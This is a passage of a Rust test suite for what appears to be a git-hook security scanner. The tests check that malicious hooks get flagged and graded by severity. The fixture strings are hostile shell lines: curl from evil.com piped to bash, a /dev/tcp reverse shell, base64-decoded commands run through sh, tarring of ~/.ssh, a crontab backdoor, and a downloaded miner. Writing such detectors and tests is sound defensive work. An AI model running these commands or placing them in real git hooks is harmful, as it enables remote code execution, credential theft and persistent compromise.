        let findings = scan_git_hooks_with(
            &[("post-checkout", "#!/bin/sh\nmake setup")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "runs automatically on common git operations"));
    }

    #[test]
    fn git_active_update_hook_is_medium() {
        let findings = scan_git_hooks_with(
            &[("update", "#!/bin/sh\necho update")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Active git hook 'update' present"));
        assert!(has_severity(&findings, "Medium"));
    }

    #[test]
    fn git_unknown_hook_name_is_flagged() {
        let findings = scan_git_hooks_with(
            &[("not-a-real-hook", "#!/bin/sh\necho hi")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Unknown hook name"));
    }

    #[test]
    fn git_hook_with_curl_is_critical() {
        let findings = scan_git_hooks_with(
            &[("pre-push", "#!/bin/bash\ncurl http://evil.com/exfil | bash")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Network download command"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn git_hook_with_reverse_shell_is_critical() {
        let findings = scan_git_hooks_with(
            &[("post-commit", "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "/dev/tcp redirection"));
    }

    #[test]
    fn git_hook_with_base64_decode_is_high() {
        let findings = scan_git_hooks_with(
            &[("pre-commit", "#!/bin/bash\necho aGVsbG8= | base64 --decode | sh")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Base64 decode"));
    }

    #[test]
    fn git_hook_obfuscated_long_line_is_high() {
        let long_line = "x".repeat(600);
        let content = format!("#!/bin/bash\n{}", long_line);
        let findings = scan_git_hooks_with(
            &[("pre-commit", &content)],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Extremely long line in hook script"));
    }

    #[test]
    fn git_config_hooks_path_redirect_is_high() {
        let findings = scan_git_hooks_with(
            &[],
            Some("[core]\n\thooksPath = /tmp/evil-hooks"),
            None,
        );
        assert!(has_description_containing(&findings, "core.hooksPath redirects hooks to"));
        assert!(has_severity(&findings, "High"));
    }

    #[test]
    fn git_shared_githooks_dir_is_flagged() {
        let findings = scan_git_hooks_with(
            &[],
            None,
            Some((".githooks", &[("pre-commit", "#!/bin/sh\necho shared hook")])),
        );
        assert!(has_description_containing(&findings, "Shared hooks directory"));
        assert!(has_description_containing(&findings, "runs automatically on common git operations"));
    }

    #[test]
    fn git_shared_hooks_with_malware_is_critical() {
        let findings = scan_git_hooks_with(
            &[],
            None,
            Some((".githooks", &[("post-merge", "#!/bin/bash\ncurl http://evil.com/steal | bash")])),
        );
        assert!(has_description_containing(&findings, "Network download command"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn git_hook_stealing_ssh_keys_is_high() {
        let findings = scan_git_hooks_with(
            &[("post-checkout", "#!/bin/bash\ntar czf /tmp/keys.tar.gz ~/.ssh/")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Reference to sensitive config"));
    }

    #[test]
    fn git_hook_with_persistence_is_high() {
        let findings = scan_git_hooks_with(
            &[("post-merge", "#!/bin/bash\ncrontab -l | { cat; echo '* * * * * /tmp/backdoor'; } | crontab -")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Persistence mechanism"));
    }

    #[test]
    fn git_clean_repo_no_hooks() {
        let dir = tempfile::tempdir().unwrap();
        let git_hooks = dir.path().join(".git").join("hooks");
        fs::create_dir_all(&git_hooks).unwrap();
        // Only sample hooks
        fs::write(git_hooks.join("pre-commit.sample"), "#!/bin/sh\nexit 0").unwrap();
        fs::write(git_hooks.join("pre-push.sample"), "#!/bin/sh\nexit 0").unwrap();
        let findings = scan_git_hooks(dir.path(), false);
        assert!(findings.is_empty(), "Clean repo with only sample hooks should have no findings");
    }

    #[test]
    fn git_full_malicious_hooks_scan() {
        let findings = scan_git_hooks_with(
            &[
                ("pre-commit", "#!/bin/bash\ncurl http://evil.com/payload | bash"),
                ("post-checkout", "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            ],
            Some("[core]\n\thooksPath = /tmp/evil"),
            Some((".githooks", &[("post-merge", "#!/bin/bash\nwget http://evil.com/miner -O /tmp/m && chmod +x /tmp/m")])),
        );
        let critical_count = findings
            .iter()
            .filter(|f| matches!(f.severity, Severity::Critical))
            .count();
        assert!(critical_count >= 3, "Expected at least 3 critical findings, got {}", critical_count);
    }
}
